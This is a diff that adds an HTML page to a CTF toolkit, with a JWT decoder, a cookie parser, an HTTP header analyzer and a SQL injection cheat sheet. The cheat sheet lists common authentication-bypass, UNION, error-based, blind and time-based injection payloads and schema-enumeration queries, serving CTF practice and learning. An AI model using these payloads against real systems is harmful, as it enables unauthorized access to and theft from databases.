@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Tools - CTF Toolkit</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🌐 Web Tools</h1>
+            <p>Tools for web exploitation and analysis</p>
+        </header>
+
+        <nav class="main-nav">
+            <a href="../index.html" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Home</span>
+            </a>
+            <a href="crypto.html" class="nav-item">
+                <span class="icon">🔐</span>
+                <span>Cryptography</span>
+            </a>
+            <a href="encoding.html" class="nav-item">
+                <span class="icon">🔤</span>
+                <span>Encoding</span>
+            </a>
+            <a href="web.html" class="nav-item active">
+                <span class="icon">🌐</span>
+                <span>Web Tools</span>
+            </a>
+            <a href="misc.html" class="nav-item">
+                <span class="icon">🛠️</span>
+                <span>Miscellaneous</span>
+            </a>
+        </nav>
+
+        <main>
+            <!-- JWT Decoder -->
+            <section class="tool-section">
+                <h2>JWT Decoder</h2>
+                <div class="tool-input">
+                    <label for="jwtInput">JWT Token:</label>
+                    <textarea id="jwtInput" placeholder="Paste your JWT token here..."></textarea>
+                </div>
+                <div class="tool-buttons">
+                    <button class="btn" onclick="decodeJWT()">Decode JWT</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('jwtInput', 'jwtHeader', 'jwtPayload', 'jwtSignature')">Clear</button>
+                </div>
+                <div id="jwtOutputSection" class="output-section hidden">
+                    <h3>Decoded JWT:</h3>
+                    <div class="jwt-parts">
+                        <div class="jwt-part">
+                            <h4>Header:</h4>
+                            <div id="jwtHeader" class="output-content"></div>
+                            <button class="btn copy-btn" data-target="jwtHeader">Copy Header</button>
+                        </div>
+                        <div class="jwt-part">
+                            <h4>Payload:</h4>
+                            <div id="jwtPayload" class="output-content"></div>
+                            <button class="btn copy-btn" data-target="jwtPayload">Copy Payload</button>
+                        </div>
+                        <div class="jwt-part">
+                            <h4>Signature:</h4>
+                            <div id="jwtSignature" class="output-content"></div>
+                            <button class="btn copy-btn" data-target="jwtSignature">Copy Signature</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Cookie Parser -->
+            <section class="tool-section">
+                <h2>Cookie Parser</h2>
+                <div class="tool-input">
+                    <label for="cookieInput">Cookie String:</label>
+                    <textarea id="cookieInput" placeholder="Paste cookie string (e.g., name1=value1; name2=value2)..."></textarea>
+                </div>
+                <div class="tool-buttons">
+                    <button class="btn" onclick="parseCookies()">Parse Cookies</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('cookieInput', 'cookieOutput')">Clear</button>
+                </div>
+                <div id="cookieOutputSection" class="output-section hidden">
+                    <h3>Parsed Cookies:</h3>
+                    <div id="cookieOutput" class="output-content"></div>
+                    <button class="btn copy-btn" data-target="cookieOutput">Copy</button>
+                </div>
+            </section>
+
+            <!-- HTTP Headers Analyzer -->
+            <section class="tool-section">
+                <h2>HTTP Headers Analyzer</h2>
+                <div class="tool-input">
+                    <label for="headersInput">HTTP Headers:</label>
+                    <textarea id="headersInput" placeholder="Paste HTTP headers here..."></textarea>
+                </div>
+                <div class="tool-buttons">
+                    <button class="btn" onclick="analyzeHeaders()">Analyze Headers</button>
+                    <button class="btn btn-secondary" onclick="ctfToolkit.clearFields('headersInput', 'headersOutput')">Clear</button>
+                </div>
+                <div id="headersOutputSection" class="output-section hidden">
+                    <h3>Analysis:</h3>
+                    <div id="headersOutput" class="output-content"></div>
+                    <button class="btn copy-btn" data-target="headersOutput">Copy</button>
+                </div>
+            </section>
+
+            <!-- SQL Injection Cheat Sheet -->
+            <section class="tool-section">
+                <h2>SQL Injection Cheat Sheet</h2>
+                <div class="cheat-sheet">
+                    <h4>Authentication Bypass</h4>
+                    <code>' OR '1'='1</code>
+                    <code>' OR '1'='1' --</code>
+                    <code>' OR '1'='1' #</code>
+                    <code>admin' --</code>
+                    <code>admin' #</code>
+                    <code>admin'/*</code>
+                    
+                    <h4>Union-based SQL Injection</h4>
+                    <code>' UNION SELECT NULL--</code>
+                    <code>' UNION SELECT NULL,NULL--</code>
+                    <code>' UNION SELECT NULL,NULL,NULL--</code>
+                    <code>' UNION SELECT 1,2,3--</code>
+                    
+                    <h4>Error-based SQL Injection</h4>
+                    <code>' AND 1=CONVERT(int, @@version)--</code>
+                    <code>' AND 1=CAST(@@version AS int)--</code>
+                    
+                    <h4>Boolean-based Blind SQL Injection</h4>
+                    <code>' AND 1=1--</code>
+                    <code>' AND 1=2--</code>
+                    <code>' AND SUBSTRING(@@version,1,1)='M'--</code>
+                    
+                    <h4>Time-based Blind SQL Injection</h4>
+                    <code>' AND SLEEP(5)--</code>
+                    <code>' AND BENCHMARK(1000000,MD5('A'))--</code>
+                    <code>'; WAITFOR DELAY '00:00:05'--</code>
+                    
+                    <h4>Database Enumeration</h4>
+                    <code>' UNION SELECT schema_name FROM information_schema.schemata--</code>
+                    <code>' UNION SELECT table_name FROM information_schema.tables--</code>
+                    <code>' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--</code>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <p>CTF Toolkit v1.0 | Made by AditSinX for CTF enthusiasts</p>
+        </footer>
+    </div>
+
+    <script src="../js/main.js"></script>
+    <script src="../js/web.js"></script>
+</body>
+</html>
